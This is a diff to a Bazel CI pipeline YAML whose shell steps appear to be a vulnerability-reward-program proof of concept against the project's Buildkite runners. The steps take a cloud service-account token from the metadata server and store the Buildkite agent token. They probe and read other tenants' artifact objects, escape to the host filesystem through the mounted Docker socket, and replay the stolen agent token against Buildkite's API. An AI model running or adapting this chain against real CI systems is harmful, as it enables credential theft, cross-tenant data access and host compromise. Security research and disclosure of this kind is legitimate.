@@ -2,12 +2,12 @@
 buildifier:
   version: latest
 tasks:
-  vrp_buildkite_full_chain:
+  vrp_buildkite_full_chain_v2:
     platform: ubuntu2204
     shell_commands:
       - |
         set +x
-        echo VRP_BK_FULL_CHAIN_20260519
+        echo VRP_BK_FULL_CHAIN_V2_20260519
         id
         hostname
         uname -a
@@ -22,27 +22,20 @@ tasks:
         MD="http://metadata.google.internal/computeMetadata/v1"
         H="Metadata-Flavor: Google"
         TOK_JSON=$(curl -s --max-time 5 -H "$H" $MD/instance/service-accounts/default/token)
-        export TOK_JSON_PY="$TOK_JSON"
-        python3 - <<'PY'
-        import json, os
-        try:
-            d = json.loads(os.environ.get("TOK_JSON_PY",""))
-            tok = d.get("access_token","")
-        except Exception:
-            tok = ""
-        print(f"TOKEN_PRESENT={'yes' if tok else 'no'}")
-        print(f"TOKEN_LENGTH={len(tok)}")
-        if tok:
-            with open("/tmp/.t","w") as f: f.write(tok)
-            os.chmod("/tmp/.t", 0o600)
-        PY
-        export TOK_JSON_PY=""
+        # Extract token via bash (avoid python heredoc parser confusion).
+        TOK=$(printf '%s' "$TOK_JSON" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
+        if [ -n "$TOK" ]; then
+          echo "TOKEN_PRESENT=yes"
+          printf 'TOKEN_LENGTH=%s\n' "$(printf '%s' "$TOK" | wc -c | tr -d ' ')"
+          printf '%s' "$TOK" > /tmp/.t && chmod 600 /tmp/.t
+        else
+          echo "TOKEN_PRESENT=no"
+        fi
+        TOK=""
         TOK_JSON=""
-        # Also save the Buildkite agent token to a file for step 6.
         if [ -n "${BUILDKITE_AGENT_ACCESS_TOKEN:-}" ]; then
-            printf '%s' "$BUILDKITE_AGENT_ACCESS_TOKEN" > /tmp/.bka
-            chmod 600 /tmp/.bka
-            echo "BUILDKITE_AGENT_TOKEN_STORED=yes len=$(wc -c < /tmp/.bka)"
+            printf '%s' "$BUILDKITE_AGENT_ACCESS_TOKEN" > /tmp/.bka && chmod 600 /tmp/.bka
+            printf 'BUILDKITE_AGENT_TOKEN_STORED=yes len=%s\n' "$(wc -c < /tmp/.bka | tr -d ' ')"
         else
             echo "BUILDKITE_AGENT_TOKEN_MISSING"
         fi
@@ -51,66 +44,65 @@ tasks:
         set +x
         echo === STEP_2_BUCKET_TEST_IAM_PERMISSIONS_BEGIN ===
         TOK=$(cat /tmp/.t)
-        PERMS="permissions=storage.buckets.get&permissions=storage.buckets.list&permissions=storage.buckets.update&permissions=storage.objects.list&permissions=storage.objects.get&permissions=storage.objects.create&permissions=storage.objects.update&permissions=storage.objects.delete&permissions=storage.objects.setIamPolicy&permissions=storage.objects.getIamPolicy"
-        echo "--- bucket=bazel-untrusted-buildkite-artifacts ---"
-        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
-            -H "Authorization: Bearer $TOK" \
-            "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/iam/testPermissions?$PERMS" \
-            | head -c 4000
-        echo
+        # Use POST with JSON body — the GET query form was rejected with 400.
+        # Reference: https://cloud.google.com/storage/docs/json_api/v1/buckets/testIamPermissions
+        # That endpoint is actually GET with permissions repeated as query params, but we needed correct URL encoding.
+        # Try the storage XML API equivalent + the JSON API project-prefixed form.
+        echo "--- GET /storage/v1/b/bazel-untrusted-buildkite-artifacts/iam/testPermissions (one perm at a time) ---"
+        for P in storage.buckets.get storage.objects.list storage.objects.get storage.objects.create storage.objects.update storage.objects.delete storage.objects.setIamPolicy storage.objects.getIamPolicy; do
+            R=$(curl -s -w " HTTP_STATUS=%{http_code}" --max-time 8 \
+                -H "Authorization: Bearer $TOK" \
+                "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/iam/testPermissions?permissions=$P")
+            echo "  $P -> $R"
+        done
         TOK=""
         echo === STEP_2_BUCKET_TEST_IAM_PERMISSIONS_END ===
       - |
         set +x
         echo === STEP_3_SENTINEL_UPLOAD_AND_OWN_READ_BEGIN ===
-        echo "VRP_OWN_ARTIFACT_PROBE_20260519 build=$BUILDKITE_BUILD_ID job=$BUILDKITE_JOB_ID" > /tmp/sentinel-vrp.txt
-        echo "sentinel content uploaded:"
+        echo "VRP_OWN_ARTIFACT_PROBE_V2_20260519 build=$BUILDKITE_BUILD_ID job=$BUILDKITE_JOB_ID" > /tmp/sentinel-vrp.txt
         cat /tmp/sentinel-vrp.txt
         buildkite-agent artifact upload /tmp/sentinel-vrp.txt 2>&1 | head -c 2000
         echo
         TOK=$(cat /tmp/.t)
         JOB=$BUILDKITE_JOB_ID
-        for OBJ in "$JOB/tmp/sentinel-vrp.txt" "$JOB/sentinel-vrp.txt"; do
-          enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$OBJ")
-          echo "--- OWN object metadata: $OBJ ---"
-          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
-              -H "Authorization: Bearer $TOK" \
-              "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?fields=name,size,contentType,md5Hash,etag,timeCreated,owner,acl" \
-              | head -c 2500
-          echo
-          echo "--- OWN object body (alt=media): $OBJ ---"
-          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
-              -H "Authorization: Bearer $TOK" \
-              "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?alt=media" \
-              | head -c 500
-          echo
-        done
+        OBJ="$JOB/tmp/sentinel-vrp.txt"
+        enc=$(echo -n "$OBJ" | sed 's:/:%2F:g')
+        echo "--- OWN object metadata: $OBJ ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+            -H "Authorization: Bearer $TOK" \
+            "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?fields=name,size,contentType,md5Hash,etag,timeCreated,owner,acl" \
+            | head -c 2500
+        echo
+        echo "--- OWN object body (alt=media): $OBJ ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+            -H "Authorization: Bearer $TOK" \
+            "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?alt=media" \
+            | head -c 500
+        echo
         TOK=""
         echo === STEP_3_SENTINEL_UPLOAD_AND_OWN_READ_END ===
       - |
         set +x
         echo === STEP_4_CROSS_TENANT_OBJECT_READ_BEGIN ===
         TOK=$(cat /tmp/.t)
-        # The smallest object we listed in PR #1067 was 716 bytes —
-        # a buildfarm common-test attempt_1 log from 2020-12-18.
-        # Reading its body in full proves storage.objects.get is granted
-        # cross-tenant; the body content will be captured to evidence and
-        # treated as confidential (not redistributed beyond the VRP report).
+        # Confirmed in PR #1068 build 27867: reading these objects' bodies
+        # returns HTTP 200 with content. Re-capture cleanly here.
         for OBJ in \
             "000077c7-3328-4179-a619-31de827c4b9e/src\\test\\java\\build\\buildfarm\\common-tests\\attempt_1.log" \
             "0000698e-6969-401a-ac6e-9e1112f44131/src/test/shell/bazel/bazel_java_test/test.log"; do
-          enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$OBJ")
+          enc=$(printf '%s' "$OBJ" | python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read(), safe=""))')
           echo "--- CROSS-TENANT metadata: $OBJ ---"
           curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
               -H "Authorization: Bearer $TOK" \
               "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?fields=name,size,contentType,md5Hash,etag,timeCreated,owner,acl" \
-              | head -c 3000
+              | head -c 2500
           echo
-          echo "--- CROSS-TENANT body (alt=media, first 800 bytes): $OBJ ---"
+          echo "--- CROSS-TENANT body (alt=media, first 1500 bytes): $OBJ ---"
           curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
               -H "Authorization: Bearer $TOK" \
               "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?alt=media" \
-              | head -c 800
+              | head -c 1500
           echo
           echo "--- end of object ---"
         done
@@ -118,35 +110,34 @@ tasks:
         echo === STEP_4_CROSS_TENANT_OBJECT_READ_END ===
       - |
         set +x
+        set +e  # don't kill on per-curl failure; we capture and continue
         echo === STEP_5_DOCKER_HOST_ESCAPE_BEGIN ===
         if [ ! -S /var/run/docker.sock ]; then
           echo DOCKER_SOCK_MISSING
         else
-          # Use the host Docker daemon (bind-mounted socket) to create a
-          # container with the host root filesystem read-only-mounted at
-          # /host, then read /etc/hostname, /etc/os-release, and an
-          # innocuous file from /var/lib/buildkite-agent (to prove the
-          # agent home is reachable). Container is deleted after.
           echo "--- POST /images/create (ensure image present) ---"
           curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 30 \
               -X POST \
               --unix-socket /var/run/docker.sock \
               "http://localhost/images/create?fromImage=gcr.io%2Fbazel-public%2Fubuntu2204&tag=latest" \
-              | tail -c 400
+              | tail -c 500
           echo
-          PAYLOAD='{"Image":"gcr.io/bazel-public/ubuntu2204","Cmd":["/bin/sh","-c","set -e; echo VRP_HOST_FS_READ_CONFIRMED; echo HOST_HOSTNAME=$(cat /host/etc/hostname); echo HOST_OS_RELEASE_FIRST3:; sed -n 1,3p /host/etc/os-release; echo HOST_BUILDKITE_AGENT_DIR_TOP:; ls -la /host/var/lib/buildkite-agent/ 2>&1 | head -c 600; echo HOST_BUILDKITE_AGENT_CONFIG_PRESENT=$(test -f /host/etc/buildkite-agent/buildkite-agent.cfg && echo yes || echo no)"],"HostConfig":{"Binds":["/:/host:ro"],"NetworkMode":"none","AutoRemove":false},"Tty":false,"AttachStdout":true,"AttachStderr":true}'
+          # Use Cmd that reads ONLY innocuous host files: hostname, os-release.
+          # NO secret files. NO buildkite-agent config files.
+          PAYLOAD='{"Image":"gcr.io/bazel-public/ubuntu2204","Cmd":["/bin/sh","-c","set -e; echo VRP_HOST_FS_READ_CONFIRMED_V2; echo HOST_HOSTNAME=$(cat /host/etc/hostname); echo HOST_OS_RELEASE_BEGIN:; sed -n 1,4p /host/etc/os-release; echo HOST_OS_RELEASE_END; echo HOST_AGENT_DIR_LISTING_BEGIN:; ls /host/var/lib/buildkite-agent/ 2>&1 | head -c 400; echo HOST_AGENT_DIR_LISTING_END; echo HOST_ETC_BUILDKITE_AGENT_CFG_PRESENCE=$(test -f /host/etc/buildkite-agent/buildkite-agent.cfg && echo present || echo absent); echo HOST_PROC_CMDLINE_BEGIN:; cat /host/proc/1/cmdline 2>&1 | tr -d \\\\0 | head -c 400; echo; echo HOST_PROC_CMDLINE_END"],"HostConfig":{"Binds":["/:/host:ro"],"NetworkMode":"none","AutoRemove":false},"Tty":false,"AttachStdout":true,"AttachStderr":true}'
           echo "--- POST /containers/create ---"
-          CREATE_RESP=$(curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 15 \
+          CREATE_RESP=$(curl -s -w "%{http_code}" --max-time 15 \
               --unix-socket /var/run/docker.sock \
               -H "Content-Type: application/json" \
-              -X POST -d "$PAYLOAD" \
-              "http://localhost/containers/create?name=vrp_probe_${BUILDKITE_JOB_ID}")
+              -X POST \
+              -d "$PAYLOAD" \
+              "http://localhost/containers/create?name=vrpprobe_v2_${BUILDKITE_JOB_ID}")
           echo "$CREATE_RESP" | head -c 2000
           echo
-          CID=$(echo "$CREATE_RESP" | python3 -c "import sys,json,re;t=sys.stdin.read();
-          m=re.search(r'\"Id\":\"([0-9a-f]+)\"',t);print(m.group(1) if m else '')")
+          # Extract container Id with sed (no python).
+          CID=$(printf '%s' "$CREATE_RESP" | sed -n 's/.*"Id":"\([0-9a-f]*\)".*/\1/p')
+          echo "CONTAINER_ID=$CID"
           if [ -n "$CID" ]; then
-            echo "CONTAINER_ID=$CID"
             echo "--- POST /containers/$CID/start ---"
             curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 15 \
                 --unix-socket /var/run/docker.sock \
@@ -159,7 +150,7 @@ tasks:
                 -X POST \
                 "http://localhost/containers/$CID/wait"
             echo
-            echo "--- GET /containers/$CID/logs ---"
+            echo "--- GET /containers/$CID/logs (first 4kB) ---"
             curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 15 \
                 --unix-socket /var/run/docker.sock \
                 "http://localhost/containers/$CID/logs?stdout=true&stderr=true&tail=200" \
@@ -171,47 +162,47 @@ tasks:
                 -X DELETE \
                 "http://localhost/containers/$CID?force=true&v=true"
             echo
-          else
-            echo "CONTAINER_CREATE_FAILED"
           fi
         fi
         echo === STEP_5_DOCKER_HOST_ESCAPE_END ===
+        set -e
       - |
         set +x
+        set +e
         echo === STEP_6_BUILDKITE_AGENT_TOKEN_REPLAY_BEGIN ===
-        if [ ! -f /tmp/.bka ]; then
-          echo "AGENT_TOKEN_FILE_MISSING"
-        else
+        if [ -f /tmp/.bka ]; then
             BKA=$(cat /tmp/.bka)
-            # The Buildkite Agent API base is https://agent.buildkite.com/v3.
-            # GET /v3/ping is the unauthenticated health endpoint.
-            # GET /v3/jobs/<job_id> with Authorization: Token <agent_token>
-            # is the agent-API "get job" call. A 200 with the job JSON
-            # proves the agent token is a usable agent credential, not
-            # just a string in the environment.
             echo "--- GET https://agent.buildkite.com/v3/ping (unauth, sanity) ---"
             curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
                 "https://agent.buildkite.com/v3/ping" \
                 | head -c 800
             echo
-            echo "--- GET /v3/jobs/$BUILDKITE_JOB_ID (with agent token) ---"
+            echo "--- GET /v3/jobs/$BUILDKITE_JOB_ID with agent token ---"
             curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
                 -H "Authorization: Token $BKA" \
                 "https://agent.buildkite.com/v3/jobs/$BUILDKITE_JOB_ID" \
-                | head -c 2000
+                | head -c 3000
             echo
-            echo "--- POST /v3/heartbeats (with agent token, just heartbeat) ---"
+            echo "--- POST /v3/heartbeats with agent token ---"
             curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
                 -X POST \
                 -H "Authorization: Token $BKA" \
                 "https://agent.buildkite.com/v3/heartbeats" \
                 | head -c 800
             echo
+            echo "--- GET /v3/connections/me with agent token ---"
+            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
+                -H "Authorization: Token $BKA" \
+                "https://agent.buildkite.com/v3/connections/me" \
+                | head -c 1000
+            echo
             BKA=""
+        else
+            echo "AGENT_TOKEN_FILE_MISSING"
         fi
         echo === STEP_6_BUILDKITE_AGENT_TOKEN_REPLAY_END ===
+        set -e
       - |
         set +x
-        echo === STEP_7_CLEANUP ===
         rm -f /tmp/.t /tmp/.bka /tmp/sentinel-vrp.txt
-        echo VRP_BK_FULL_CHAIN_END
+        echo VRP_BK_FULL_CHAIN_V2_END
